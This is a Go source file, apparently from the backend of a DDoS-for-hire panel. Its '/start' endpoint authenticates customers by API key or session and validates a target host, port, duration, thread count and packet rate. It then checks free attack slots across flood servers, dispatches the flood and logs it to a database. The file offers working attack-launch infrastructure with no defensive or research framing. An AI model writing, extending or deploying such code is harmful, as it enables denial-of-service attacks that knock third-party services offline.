package attackapi

import (
	"api/core/database"
	"api/core/database/users"
	"api/core/database/atks"
	"api/core/master/sessions"
	"api/core/models/apis"
	"api/core/models/floods"
	"api/core/models/functions"
	"api/core/models/server"
	"api/core/models/servers"
	"encoding/json"
	"net/http"
)

func init() {
	Route.NewSub(server.NewRoute("/start", func(w http.ResponseWriter, r *http.Request) {
			type status struct {
				Status  string `json:"status"`
				Message string `json:"message"`
				Attacks []int  `json:"attack_ids"`
			}
			handleError := func(message string) {
				json.NewEncoder(w).Encode(status{Status: "error", Message: message})
			}
			blacklists, _ := atks.Container.GetAllBlacklists()
			switch r.Method {
			case http.MethodGet, http.MethodPost:
				var parent *database.User
				if r.Method == http.MethodGet {
					key, ok := functions.GetKey(w, r)
					if !ok {
						return
					}
					if !users.HasPermission(key, "api") {
						handleError("You do not have API access!")
						return
					}
					parent = key
				} else {
					_, user := sessions.IsLoggedIn(w, r)
					parent = user.User
				}
		
				params, err := ParseAndValidate(r, parent, blacklists)
				if err != nil {
					w.WriteHeader(http.StatusBadRequest)
					json.NewEncoder(w).Encode(status{"error", err.Error(), nil})
					return
				}
		
				// build attack object
				flood := floods.New(params.Method)
				flood.Target   = params.Host
				flood.Port     = params.Port
				flood.Duration = params.Duration
				flood.Threads  = params.Threads
				flood.PPS      = params.PPS

				switch flood.Type {
				case 1:
					if atks.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
						handleError("No available slot to start attack!")
						return
					}
				case 2:
					if atks.Container.GlobalRunningType(2) >= servers.Slots()[2]+apis.Slots() {
						handleError("No available slot to start attack!")
						return
					}
				}	
		
				// actually send
				msg, sendErr := SendAttack(params.Concurrents, flood)
				if sendErr != nil {
					json.NewEncoder(w).Encode(status{"error", sendErr.Error(), nil})
					return
				}
				floods.TotalUsage++
				// save to DB
				ids, _ := SaveToDB(parent, flood, params.Concurrents)
				json.NewEncoder(w).Encode(status{"success", msg, ids})
		
			default:
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			}
		}))
	}